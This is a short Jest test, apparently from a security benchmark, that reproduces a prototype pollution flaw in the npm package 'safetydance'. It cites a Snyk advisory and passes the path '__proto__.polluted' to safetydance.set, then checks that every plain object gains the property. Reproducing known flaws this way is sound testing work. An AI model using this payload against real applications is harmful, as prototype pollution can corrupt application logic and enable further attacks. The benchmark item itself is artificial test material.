//https://snyk.io/vuln/SNYK-JS-SAFETYDANCE-598687

test("prototype pollution in safetydance", () => {
  const safetydance = require("safetydance");
  obj = {};

  expect({}.polluted).toBe(undefined);

  safetydance.set({}, process.env.SECBENCH_PAYLOAD || "__proto__.polluted", "yes");
  expect({}.polluted).toBe("yes");
});
